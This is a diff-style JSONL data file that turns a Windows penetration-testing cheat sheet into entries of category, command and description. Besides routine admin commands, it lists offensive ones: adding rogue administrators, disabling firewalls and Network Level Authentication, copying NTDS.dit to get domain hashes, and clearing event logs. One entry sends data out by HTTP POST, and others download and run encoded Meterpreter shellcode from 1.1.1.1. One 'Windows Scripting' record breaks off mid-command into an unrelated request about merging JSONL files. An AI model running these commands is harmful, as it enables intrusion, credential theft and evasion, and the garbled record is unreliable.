+{"category": "Windows System Info Commands", "command": "dir /a /s /b c:\\*.pdf", "description": "Search for all PDFs"}
+{"category": "Windows System Info Commands", "command": "dir /a /b c:\\windows\\kb*", "description": "Search for patches"}
+{"category": "Windows System Info Commands", "command": "findstr /si password *.txt *.xml *.xls", "description": "Search files for password"}
+{"category": "Windows System Info Commands", "command": "tree /F /A c:\\ > tree.txt", "description": "Directory listing of C:"}
+{"category": "Windows System Info Commands", "command": "reg save HKLM\\Security security.hive", "description": "Save security hive to file"}
+{"category": "Windows System Info Commands", "command": "echo %USERNAME%", "description": "Current user"}
+{"category": "Windows Net/Domain Commands", "command": "net view /domain", "description": "Hosts in current domain"}
+{"category": "Windows Net/Domain Commands", "command": "net view /domain:MYDOMAIN", "description": "Hosts in MYDOMAIN"}
+{"category": "Windows Net/Domain Commands", "command": "net user /domain", "description": "All users in current domain"}
+{"category": "Windows Net/Domain Commands", "command": "net user user pass /add", "description": "Add user"}
+{"category": "Windows Net/Domain Commands", "command": "net localgroup \"Administrators\" user /add", "description": "Add user to Administrators"}
+{"category": "Windows Net/Domain Commands", "command": "net accounts /domain", "description": "Domain password policy"}
+{"category": "Windows Net/Domain Commands", "command": "net localgroup \"Administrators\"", "description": "List local Admins"}
+{"category": "Windows Net/Domain Commands", "command": "net group /domain", "description": "List domain groups"}
+{"category": "Windows Net/Domain Commands", "command": "net group \"Domain Admins\" /domain", "description": "List users in Domain Admins"}
+{"category": "Windows Net/Domain Commands", "command": "net group \"Domain Controllers\" /domain", "description": "List DCs for current domain"}
+{"category": "Windows Net/Domain Commands", "command": "net share", "description": "Current SMB shares"}
+{"category": "Windows Net/Domain Commands", "command": "net session | find \"\\\\\"", "description": "Active SMB sessions"}
+{"category": "Windows Net/Domain Commands", "command": "net user user /ACTIVE:yes /domain", "description": "Unlock domain user account"}
+{"category": "Windows Net/Domain Commands", "command": "net user user newpassword /domain", "description": "Change domain user password"}
+{"category": "Windows Net/Domain Commands", "command": "net share share c:\\share /GRANT:Everyone,FULL", "description": "Share folder"}
+{"category": "Windows Remote Commands", "command": "tasklist /S ip /v", "description": "Remote process listing"}
+{"category": "Windows Remote Commands", "command": "systeminfo /S ip /U domain\\user /P pwd", "description": "Remote system info"}
+{"category": "Windows Remote Commands", "command": "net share \\\\ip", "description": "Shares of remote computer"}
+{"category": "Windows Remote Commands", "command": "net use \\\\ip", "description": "Remote filesystem (IPC$)"}
+{"category": "Windows Remote Commands", "command": "net use z: \\\\ip\\share password /user:DOMAIN\\user", "description": "Map drive with specified credentials"}
+{"category": "Windows Remote Commands", "command": "reg add \\\\ip\\regkey\\value", "description": "Add registry key remotely"}
+{"category": "Windows Remote Commands", "command": "sc \\\\ip create service binpath=C:\\Windows\\System32\\x.exe start=auto", "description": "Create a remote service (space after start=)"}
+{"category": "Windows Remote Commands", "command": "xcopy /s \\\\ip\\dir C:\\local", "description": "Copy remote folder"}
+{"category": "Windows Remote Commands", "command": "shutdown /m \\\\ip /r /t 0 /f", "description": "Remotely reboot machine"}
+{"category": "Windows Network Commands", "command": "ipconfig /all", "description": "IP configuration"}
+{"category": "Windows Network Commands", "command": "ipconfig /displaydns", "description": "Local DNS cache"}
+{"category": "Windows Network Commands", "command": "netstat -ana", "description": "Open connections"}
+{"category": "Windows Network Commands", "command": "netstat -anop tcp", "description": "Netstat loop"}
+{"category": "Windows Network Commands", "command": "netstat -ano | findstr LISTENING", "description": "LISTENING ports"}
+{"category": "Windows Network Commands", "command": "route print", "description": "Routing table"}
+{"category": "Windows Network Commands", "command": "arp -a", "description": "Known MACs (ARP table)"}
+{"category": "Windows Network Commands", "command": "nslookup set type=any ls -d domain > results.txt exit", "description": "DNS Zone Xfer"}
+{"category": "Windows Network Commands", "command": "nslookup -type=SRV _www._tcp.url.com", "description": "Domain SRV lookup (ldap, kerberos, sip)"}
+{"category": "Windows Network Commands", "command": "tftp -i ip GET remotefile", "description": "TFTP file transfer"}
+{"category": "Windows Network Commands", "command": "netsh wlan show profiles", "description": "Saved wireless profiles"}
+{"category": "Windows Network Commands", "command": "netsh firewall set opmode disable", "description": "Disable firewall (Old)"}
+{"category": "Windows Network Commands", "command": "netsh wlan export profile folder=. key=clear", "description": "Export wifi plaintext password"}
+{"category": "Windows Network Commands", "command": "netsh interface ip show interfaces", "description": "List interface IDs/MTUs"}
+{"category": "Windows Network Commands", "command": "netsh interface ip set address local static ip nmask gw ID", "description": "Set IP"}
+{"category": "Windows Network Commands", "command": "netsh interface ip set dns local static ip", "description": "Set DNS server"}
+{"category": "Windows Network Commands", "command": "netsh interface ip set address local dhcp", "description": "Set interface to use DHCP"}
+{"category": "Windows Utility Commands", "command": "type file", "description": "Display file contents"}
+{"category": "Windows Utility Commands", "command": "del path\\*.* /a /s /q /f", "description": "Forcibly delete all files in path"}
+{"category": "Windows Utility Commands", "command": "find /I \"str\" filename", "description": "Find \"str\" in file"}
+{"category": "Windows Utility Commands", "command": "command | find /c /v \"\"", "description": "Line count of command output"}
+{"category": "Windows Utility Commands", "command": "at HH:MM file [args]", "description": "Schedule file to run (e.g., at 14:45 cmd /c)"}
+{"category": "Windows Utility Commands", "command": "runas /user:user \"file [args]\"", "description": "Run file as user"}
+{"category": "Windows Utility Commands", "command": "shutdown /r /t 0", "description": "Restart now"}
+{"category": "Windows Utility Commands", "command": "tr -d '\\15\\32' win.txt > unix.txt", "description": "Removes CR & LF (Unix conversion)"}
+{"category": "Windows Utility Commands", "command": "makecab file", "description": "Native compression"}
+{"category": "Windows Utility Commands", "command": "wusa.exe /uninstall /kb:###", "description": "Uninstall patch"}
+{"category": "Windows Utility Commands", "command": "cmd.exe \"wevtutil qe Application /c:40 /f:text /rd:true\"", "description": "CLI Event Viewer"}
+{"category": "Windows Utility Commands", "command": "lusrmgr.msc", "description": "Local user manager"}
+{"category": "Windows Utility Commands", "command": "services.msc", "description": "Services control panel"}
+{"category": "Windows Utility Commands", "command": "taskmgr.exe", "description": "Task manager"}
+{"category": "Windows Utility Commands", "command": "secpol.msc", "description": "Security policy manager"}
+{"category": "Windows Utility Commands", "command": "eventvwr.msc", "description": "Event viewer"}
+{"category": "Misc. Commands", "command": "rundll32.dll user32.dll LockWorkstation", "description": "Lock workstation"}
+{"category": "Misc. Commands", "command": "netsh advfirewall set currentprofile state off", "description": "Disable Windows firewall (current profile)"}
+{"category": "Misc. Commands", "command": "netsh advfirewall set allprofiles state off", "description": "Disable Windows firewall (all profiles)"}
+{"category": "Misc. Commands", "command": "netsh interface portproxy add v4tov4 listenport=3000 listenaddress=1.1.1.1 connectport=4000 connectaddress=2.2.2.2", "description": "Native Windows port forward (must be admin)"}
+{"category": "Misc. Commands", "command": "netsh interface portproxy delete v4tov4 listenport=3000 listenaddress=1.1.1.1", "description": "Remove port forward"}
+{"category": "Misc. Commands", "command": "reg add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 0 /f", "description": "Re-enable command prompt"}
+{"category": "Misc. Commands", "command": "psexec /accepteula \\\\targetIP -u domain\\user -p password -c -f \\\\smbIP\\share\\file.exe", "description": "Execute file hosted on remote system with credentials"}
+{"category": "Misc. Commands", "command": "psexec /accepteula \\\\ip -u Domain\\user -p NTLM_hash cmd.exe /c c:\\ProgramData\\command", "description": "Run remote command with specified hash"}
+{"category": "Misc. Commands", "command": "psexec /accepteula \\\\ip -s cmd.exe", "description": "Run remote command as SYSTEM"}
+{"category": "Terminal Services (RDP)", "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f", "description": "Enable RDP"}
+{"category": "Terminal Services (RDP)", "command": "net start termservice", "description": "Start Terminal Services"}
+{"category": "Terminal Services (RDP)", "command": "sc config termservice start=auto", "description": "Set Terminal Services to start automatically"}
+{"category": "Terminal Services (RDP)", "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 443 /f", "description": "Tunnel RDP out port 443 (may need restart)"}
+{"category": "Terminal Services (RDP)", "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /t REG_DWORD /d 0 /f", "description": "Disable Network Level Authentication"}
+{"category": "Terminal Services (RDP)", "command": "netsh firewall set service type=remotedesktop mode=enable", "description": "Add firewall exception for RDP"}
+{"category": "Terminal Services (RDP)", "command": "schtasks.exe /create /tn MyTask /xml \"C:\\MyTask.xml\" /f", "description": "Import a schedule task from XML"}
+{"category": "WMIC", "command": "wmic [alias] get /?", "description": "List all attributes"}
+{"category": "WMIC", "command": "wmic [alias] call /?", "description": "List callable methods"}
+{"category": "WMIC", "command": "wmic process list full", "description": "Process attributes"}
+{"category": "WMIC", "command": "wmic startup", "description": "List startup services"}
+{"category": "WMIC", "command": "wmic service", "description": "List services"}
+{"category": "WMIC", "command": "wmic ntdomain list", "description": "Domain and DC info"}
+{"category": "WMIC", "command": "wmic qfe", "description": "List all patches"}
+{"category": "WMIC", "command": "wmic process call create \"process_name\"", "description": "Execute process"}
+{"category": "WMIC", "command": "wmic process where name=\"process\" call terminate", "description": "Terminate process"}
+{"category": "WMIC", "command": "wmic logicaldisk get description,name", "description": "View logical shares"}
+{"category": "WMIC", "command": "wmic cpu get DataWidth /format:list", "description": "Display 32 or 64 bit"}
+{"category": "WMIC", "command": "wmic /node:targetIP /user:domain\\user /password:password process call create \"\\\\smbIP\\share\\evil.exe\"", "description": "Execute file hosted over SMB with credentials"}
+{"category": "WMIC", "command": "wmic product get name /value", "description": "Get software names"}
+{"category": "WMIC", "command": "wmic product where name=\"XXX\" call uninstall /nointeractive", "description": "Uninstall software"}
+{"category": "WMIC", "command": "wmic /node:remotecomputer computersystem get username", "description": "Remotely determine logged-in user"}
+{"category": "WMIC", "command": "wmic /node:machinename process list brief /every:1", "description": "Remote process listing every second"}
+{"category": "WMIC", "command": "wmic /node:\"machinename\" path Win32_TerminalServiceSetting where AllowTSConnections=\"0\" call SetAllowTSConnections \"1\"", "description": "Remotely start RDP"}
+{"category": "WMIC", "command": "wmic netlogin where (name like \"%adm%\") get numberoflogons", "description": "List number of times user has logged on"}
+{"category": "WMIC", "command": "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\windows\\\\\" | findstr /i /v \"\"\"", "description": "Search for services with unquoted paths"}
+{"category": "Volume Shadow Copy", "command": "wmic /node:DC_IP /user:\"DOMAIN\\user\" /password:\"PASS\" process call create \"cmd /c vssadmin list shadows 2>&1 c:\\temp\\output.txt\"", "description": "List shadow copies and check for existing copies"}
+{"category": "Volume Shadow Copy", "command": "wmic /node:DC_IP /user:\"DOMAIN\\user\" /password:\"PASS\" process call create \"cmd /c vssadmin create shadow /for=C: 2>&1 C:\\temp\\output.txt\"", "description": "Create shadow copy for C: drive"}
+{"category": "Volume Shadow Copy", "command": "wmic /node:DC_IP /user:\"DOMAIN\\user\" /password:\"PASS\" process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\temp\\system.hive 2>&1 C:\\temp\\output.txt\"", "description": "Copy SYSTEM hive from shadow copy"}
+{"category": "Volume Shadow Copy", "command": "wmic /node:DC_IP /user:\"DOMAIN\\user\" /password:\"PASS\" process call create \"cmd /c copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\NTDS\\NTDS.dit C:\\temp\\ntds.dit 2>&1 C:\\temp\\output.txt\"", "description": "Copy NTDS.dit from shadow copy"}
+{"category": "Volume Shadow Copy", "command": "From Linux, download and run ntdsxtract and libesedb to export hashes or other domain information", "description": "Extract domain info using ntdsxtract and libesedb"}
+{"category": "PowerShell", "command": "Get-Content file", "description": "Displays file contents"}
+{"category": "PowerShell", "command": "Get-Help command -Examples", "description": "Shows examples of command"}
+{"category": "PowerShell", "command": "Get-Command *string*", "description": "Searches for command string"}
+{"category": "PowerShell", "command": "Get-Service", "description": "Displays services (use Stop-Service, Start-Service)"}
+{"category": "PowerShell", "command": "Get-WmiObject -Class Win32_Service", "description": "Displays services, supports alternate credentials"}
+{"category": "PowerShell", "command": "$PSVersionTable", "description": "Displays PowerShell version"}
+{"category": "PowerShell", "command": "powershell.exe -Version 2.0", "description": "Run PowerShell 2.0 from 3.0"}
+{"category": "PowerShell", "command": "Get-Service | Measure-Object", "description": "Returns number of services"}
+{"category": "PowerShell", "command": "Get-PSDrive", "description": "Returns list of PSDrives"}
+{"category": "PowerShell", "command": "Get-Process | Select-Object -ExpandProperty Name", "description": "Returns only process names"}
+{"category": "PowerShell", "command": "Get-Help * -Parameter Credential", "description": "Cmdlets that take credentials"}
+{"category": "PowerShell", "command": "Get-WmiObject -List *network*", "description": "Available WMI network commands"}
+{"category": "PowerShell", "command": "[System.Net.DNS]::GetHostEntry(\"ip\")", "description": "DNS lookup"}
+{"category": "PowerShell", "command": "Get-EventLog -List", "description": "List event logs"}
+{"category": "PowerShell", "command": "Clear-EventLog -LogName Application,Security -ComputerName SVR01", "description": "Clear Security & Application event logs for remote server"}
+{"category": "PowerShell", "command": "Get-WmiObject -Class Win32_OperatingSystem | Select-Object -Property * | Export-Csv c:\\os.csv", "description": "Export OS info to CSV file"}
+{"category": "PowerShell", "command": "Get-Service | Where-Object {$_.Status -eq \"Running\"}", "description": "List running services"}
+{"category": "PowerShell", "command": "New-PSDrive -Persist -PSProvider FileSystem -Root \\\\1.1.1.1\\tools -Name i", "description": "Persistent PSDrive to remote file share"}
+{"category": "PowerShell", "command": "Get-ChildItem -Path c:\\ -Force -Recurse -Filter *.log -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt \"2012-08-20\"}", "description": "Return files with write date past 8/20/2012"}
+{"category": "PowerShell", "command": "(New-Object System.Net.WebClient).DownloadFile(\"url\",\"dest\")", "description": "File download over HTTP"}
+{"category": "PowerShell", "command": "$ports=(80,443,445); $ip=\"x.x.x.x\"; foreach ($port in $ports) { try { $socket = New-Object System.Net.Sockets.TcpClient($ip,$port); } catch {}; if ($socket -eq $null) { echo \"$ip`:$port - Closed\"; } else { echo \"$ip`:$port - Open\"; $socket = $null; } }", "description": "TCP port scanner"}
+{"category": "PowerShell", "command": "$ping = New-Object System.Net.NetworkInformation.Ping; $ping.Send(\"ip\",500)", "description": "Ping with 500ms timeout"}
+{"category": "PowerShell", "command": "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass; $Host.UI.PromptForCredential(\"title\",\"message\",\"user\",\"domain\")", "description": "Basic authentication popup"}
+{"category": "PowerShell", "command": "powershell.exe -Command \"do { if ((Get-Date -Format yyyyMMdd-HHmm) -match '201308(0[8-9]|[0-1][0-1])-(0[8-9]|[0-1][0-7])[0-5][0-9]') { Start-Process -WindowStyle Hidden 'C:\\Temp\\my.exe'; Start-Sleep -s 14400 } } while(1)\"", "description": "Run EXE every 4 hours between Aug 8-11, 2013, 0800-1700"}
+{"category": "PowerShell", "command": "$pw = ConvertTo-SecureString -String \"PASSWORD\" -AsPlainText -Force; $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"DOMAIN\\user\",$pw; Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process file.exe -verb runas}'", "description": "PowerShell RunAs"}
+{"category": "PowerShell", "command": "powershell.exe Send-MailMessage -To \"email\" -From \"email\" -Subject \"Subject\" -Attachments \"attachment_file_path\" -Body \"Body\" -SmtpServer \"Target_Email_Server_IP\"", "description": "Email sender"}
+{"category": "PowerShell", "command": "net time \\\\ip; at \\\\ip time \"Powershell -Command 'Enable-PSRemoting -Force'\"; at \\\\ip time+1 \"Powershell -Command 'Set-Item wsman:\\localhost\\client\\trustedhosts *'\"; at \\\\ip time+2 \"Powershell -Command 'Restart-Service WinRM'\"; Enter-PSSession -ComputerName ip -Credential username", "description": "Turn on PowerShell remoting"}
+{"category": "PowerShell", "command": "Get-WmiObject -ComputerName DC -Namespace root\\MicrosoftDNS -Class MicrosoftDNS_ResourceRecord -Filter \"domainname='DOMAIN'\" | Select-Object TextRepresentation", "description": "List hostname and IP for domain computers"}
+{"category": "PowerShell", "command": "powershell.exe -NoProfile -NonInteractive -Command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $source='https://YOUR_SPECIFIED_IP/file.zip'; $destination='C:\\master.zip'; $http = New-Object System.Net.WebClient; $http.DownloadFile($source, $destination);\"", "description": "Download file from specified location"}
+{"category": "PowerShell", "command": "powershell.exe -NoProfile -NonInteractive -Command \"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $server='http://YOUR_SPECIFIED_IP/folder'; $filepath='C:\\master.zip'; $http = New-Object System.Net.WebClient; $http.UploadFile($server,$filepath);\"", "description": "Data exfiltration via HTTP POST"}
+{"category": "PowerShell", "command": "Get-ADUser -Filter * -Properties *", "description": "List all Active Directory users (requires RSAT)"}
+{"category": "PowerShell", "command": "Invoke-WebRequest -Uri \"url\" -Method Get", "description": "Perform HTTP request"}
+{"category": "PowerShell", "command": "Get-NetFirewallRule", "description": "List Windows firewall rules"}
+{"category": "PowerShell Meterpreter", "command": "$contents = Get-Content audit.ps1; $ms = New-Object IO.MemoryStream; $action = [IO.Compression.CompressionMode]::Compress; $cs = New-Object IO.Compression.DeflateStream($ms,$action); $sw = New-Object IO.StreamWriter($cs, [Text.Encoding]::ASCII); $contents | ForEach-Object {$sw.WriteLine($_)}; $sw.Close(); $code = [Convert]::ToBase64String($ms.ToArray()); $command = \"Invoke-Expression '$(New-Object IO.StreamReader($(New-Object IO.Compression.DeflateStream($(New-Object IO.MemoryStream(,[Convert]::FromBase64String('$code'))),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd();\"; $bytes = [System.Text.Encoding]::Unicode.GetBytes($command); $encodedCommand = [Convert]::ToBase64String($bytes); Write-Host $encodedCommand", "description": "encodeMeterpreter.ps1 to compress and encode Meterpreter payload"}
+{"category": "PowerShell Meterpreter", "command": "powershell.exe -NoExit -EncodedCommand [encoded_Meterpreter_string]", "description": "Launch encoded Meterpreter on target (x86)"}
+{"category": "PowerShell Meterpreter", "command": "powershell -NoProfile -NonInteractive -Command \"& {$client = New-Object System.Net.WebClient; $client.DownloadFile('http://1.1.1.1/shell.txt', 'c:\\windows\\temp\\shell.txt')}\"", "description": "Download Meterpreter shellcode"}
+{"category": "PowerShell Meterpreter", "command": "powershell -NoProfile -NonInteractive -NoExit -Command \"& {$cmd = Get-Content 'c:\\windows\\temp\\shell.txt'; powershell -NoProfile -NonInteractive -NoExit -EncodedCommand $cmd}\"", "description": "Execute downloaded Meterpreter shellcode"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion", "description": "OS information"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v ProductName", "description": "Product name"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v InstallDate", "description": "Date of install"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v RegisteredOwner", "description": "Registered owner"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion /v SystemRoot", "description": "System root"}
+{"category": "Windows Registry", "command": "HKLM\\System\\CurrentControlSet\\Control\\TimeZoneInformation /v ActiveTimeBias", "description": "Time zone (offset in minutes from UTC)"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU", "description": "Mapped network drives"}
+{"category": "Windows Registry", "command": "HKLM\\System\\MountedDevices", "description": "Mounted devices"}
+{"category": "Windows Registry", "command": "HKLM\\System\\CurrentControlSet\\Enum\\USBStor", "description": "USB devices"}
+{"category": "Windows Registry", "command": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters /v IPEnableRouter=1", "description": "Turn on IP forwarding"}
+{"category": "Windows Registry", "command": "HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets", "description": "LSA secrets (VPN, autologon, passwords)"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon /v autoadminlogon", "description": "Auto admin logon"}
+{"category": "Windows Registry", "command": "HKLM\\Security\\Policy\\PolAdtEv", "description": "Audit policy"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Services", "description": "Kernel/user services"}
+{"category": "Windows Registry", "command": "HKLM\\Software", "description": "Installed software on machine"}
+{"category": "Windows Registry", "command": "HKCU\\Software", "description": "Installed software for user"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", "description": "Recent documents"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU", "description": "Recent user locations"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU", "description": "Recent user locations"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Internet Explorer\\TypedURLs", "description": "Typed URLs"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", "description": "MRU lists"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Applets\\RegEdit /v LastKey", "description": "Last registry key accessed"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "description": "Startup location (Run)"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "description": "Startup location (RunOnce)"}
+{"category": "Windows Registry", "command": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", "description": "Startup location (Policies)"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "description": "Startup location (User Run)"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce", "description": "Startup location (User RunOnce)"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows /v Load", "description": "Startup location (Load)"}
+{"category": "Windows Registry", "command": "HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows /v Run", "description": "Startup location (Run)"}
+{"category": "Enumerating Windows Domain", "command": "dsquery user -limit 0", "description": "List users on domain with no limit"}
+{"category": "Enumerating Windows Domain", "command": "dsquery group \"cn=users,dc=victim,dc=com\"", "description": "List groups for domain=victim.com"}
+{"category": "Enumerating Windows Domain", "command": "dsquery group -name \"domain admins\" | dsget group -members -expand", "description": "List domain admin accounts"}
+{"category": "Enumerating Windows Domain", "command": "dsquery user -name bob | dsget user -memberof -expand", "description": "List all groups for a user"}
+{"category": "Enumerating Windows Domain", "command": "dsquery user -name bob | dsget user -samid", "description": "Get a user's login ID"}
+{"category": "Enumerating Windows Domain", "command": "dsquery user -inactive 2", "description": "List accounts inactive for 2 weeks"}
+{"category": "Enumerating Windows Domain", "command": "dsadd user \"CN=Bob,CN=Users,DC=victim,DC=com\" -samid bob -pwd bobpass -display \"Bob\" -pwdneverexpires yes -memberof \"CN=Domain Admins,CN=Users,DC=victim,DC=com\"", "description": "Add domain user"}
+{"category": "Enumerating Windows Domain", "command": "dsrm -subtree -noprompt \"CN=Bob,CN=Users,DC=victim,DC=com\"", "description": "Delete user"}
+{"category": "Enumerating Windows Domain", "command": "dsquery * \"DC=victim,DC=com\" -scope subtree -attr cn operatingSystem operatingSystemServicePack -filter \"(&(objectClass=computer)(objectCategory=computer)(operatingSystem=Windows*))\"", "description": "List all operating systems on domain"}
+{"category": "Enumerating Windows Domain", "command": "dsquery site -o rdn -limit 0", "description": "List all site names"}
+{"category": "Enumerating Windows Domain", "command": "dsquery subnet -site sitename -o rdn", "description": "List all subnets within a site"}
+{"category": "Enumerating Windows Domain", "command": "dsquery server -site sitename -o rdn", "description": "List all servers within a site"}
+{"category": "Enumerating Windows Domain", "command": "dsquery * domainroot -filter \"(&(objectCategory=Computer)(objectClass=Computer)(operatingSystem=*Server*))\" -limit 0", "description": "Find servers in the domain"}
+{"category": "Enumerating Windows Domain", "command": "dsquery * \"CN=Sites,CN=Configuration,DC=forestRootDomain\" -filter \"(objectCategory=Server)\"", "description": "List domain controllers per site"}
+{"category": "Windows Scripting", "command": "for /L %i in (10,1,254) do @for /L %x in (10,1,254) do @ping -n 1 -wSo I need to merge all the JSONL files into a single file. Could you please combine the following JSONL files into one, using the artifact_id from the first file:"}
+{"category": "Common Ports", "command": "21", "description": "FTP"}
+{"category": "Common Ports", "command": "22", "description": "SSH"}
+{"category": "Common Ports", "command": "23", "description": "Telnet"}
+{"category": "Common Ports", "command": "25", "description": "SMTP"}
+{"category": "Common Ports", "command": "49", "description": "TACACS"}
+{"category": "Common Ports", "command": "53", "description": "DNS"}
+{"category": "Common Ports", "command": "67/68", "description": "DHCP (UDP)"}
+{"category": "Common Ports", "command": "69", "description": "TFTP (UDP)"}
+{"category": "Common Ports", "command": "80", "description": "HTTP"}
+{"category": "Common Ports", "command": "88", "description": "Kerberos"}
+{"category": "Common Ports", "command": "110", "description": "POP3"}
+{"category": "Common Ports", "command": "111", "description": "RPC"}
+{"category": "Common Ports", "command": "123", "description": "NTP (UDP)"}
+{"category": "Common Ports", "command": "135", "description": "Windows RPC"}
+{"category": "Common Ports", "command": "137", "description": "NetBIOS"}
+{"category": "Common Ports", "command": "138", "description": "NetBIOS"}
+{"category": "Common Ports", "command": "139", "description": "SMB"}
+{"category": "Common Ports", "command": "143", "description": "IMAP"}
+{"category": "Common Ports", "command": "161", "description": "SNMP (UDP)"}
+{"category": "Common Ports", "command": "179", "description": "BGP"}
+{"category": "Common Ports", "command": "201", "description": "AppleTalk"}
+{"category": "Common Ports", "command": "389", "description": "LDAP"}
+{"category": "Common Ports", "command": "443", "description": "HTTPS"}
+{"category": "Common Ports", "command": "445", "description": "SMB"}
+{"category": "Common Ports", "command": "500", "description": "ISAKMP (UDP)"}
+{"category": "Common Ports", "command": "514", "description": "Syslog"}
+{"category": "Common Ports", "command": "520", "description": "RIP"}
+{"category": "Common Ports", "command": "546/547", "description": "DHCPv6"}
+{"category": "Common Ports", "command": "587", "description": "SMTP"}
+{"category": "Common Ports", "command": "902", "description": "VMware"}
+{"category": "Common Ports", "command": "1080", "description": "Socks Proxy"}
+{"category": "Common Ports", "command": "1194", "description": "VPN"}
+{"category": "Common Ports", "command": "1433/1434", "description": "MS-SQL"}
+{"category": "Common Ports", "command": "1521", "description": "Oracle"}
+{"category": "Common Ports", "command": "1629", "description": "DameWare"}
+{"category": "Common Ports", "command": "2049", "description": "NFS"}
+{"category": "Common Ports", "command": "3128", "description": "Squid Proxy"}
+{"category": "Common Ports", "command": "3306", "description": "MySQL"}
+{"category": "Common Ports", "command": "3389", "description": "RDP"}
+{"category": "Common Ports", "command": "5060", "description": "SIP"}
+{"category": "Common Ports", "command": "5222", "description": "Jabber"}
+{"category": "Common Ports", "command": "5432", "description": "PostgreSQL"}
+{"category": "Common Ports", "command": "5666", "description": "Nagios"}
+{"category": "Common Ports", "command": "5900", "description": "VNC"}
+{"category": "Common Ports", "command": "6000", "description": "X11"}
+{"category": "Common Ports", "command": "6129", "description": "DameWare"}
+{"category": "Common Ports", "command": "6667", "description": "IRC"}
+{"category": "Common Ports", "command": "8000", "description": "Common HTTP alternative"}
+{"category": "Common Ports", "command": "8080", "description": "Common HTTP proxy"}
+{"category": "Common Ports", "command": "8443", "description": "HTTPS alternative"}
+{"category": "Common Ports", "command": "9000", "description": "Common web server port"}
+{"category": "Common Ports", "command": "9001", "description": "Tor / HSQL"}
+{"category": "Common Ports", "command": "9090/9091", "description": "Openfire"}
+{"category": "Common Ports", "command": "9100", "description": "JetDirect"}
+{"category": "Networking", "command": "Windows: 128", "description": "TTL fingerprint for Windows"}
+{"category": "Networking", "command": "Linux: 64", "description": "TTL fingerprint for Linux"}
+{"category": "Networking", "command": "Network: 255", "description": "TTL fingerprint for Network devices"}
+{"category": "Networking", "command": "Solaris: 255", "description": "TTL fingerprint for Solaris"}
+{"category": "Networking", "command": "A: 0.0.0.0 - 127.255.255.255", "description": "Class A IP range"}
+{"category": "Networking", "command": "B: 128.0.0.0 - 191.255.255.255", "description": "Class B IP range"}
+{"category": "Networking", "command": "C: 192.0.0.0 - 223.255.255.255", "description": "Class C IP range"}
+{"category": "Networking", "command": "D: 224.0.0.0 - 239.255.255.255", "description": "Class D IP range (Multicast)"}
+{"category": "Networking", "command": "E: 240.0.0.0 - 255.255.255.255", "description": "Class E IP range (Reserved)"}
+{"category": "Networking", "command": "10.0.0.0 - 10.255.255.255", "description": "Reserved private range (Class A)"}
+{"category": "Networking", "command": "127.0.0.0 - 127.255.255.255", "description": "Reserved loopback range"}
+{"category": "Networking", "command": "172.16.0.0 - 172.31.255.255", "description": "Reserved private range (Class B)"}
+{"category": "Networking", "command": "192.168.0.0 - 192.168.255.255", "description": "Reserved private range (Class C)"}
+{"category": "Networking", "command": "/31: 255.255.255.254 (1 Host)", "description": "Subnet mask and host count"}
+{"category": "Networking", "command": "/30: 255.255.255.252 (2 Hosts)", "description": "Subnet mask and host count"}
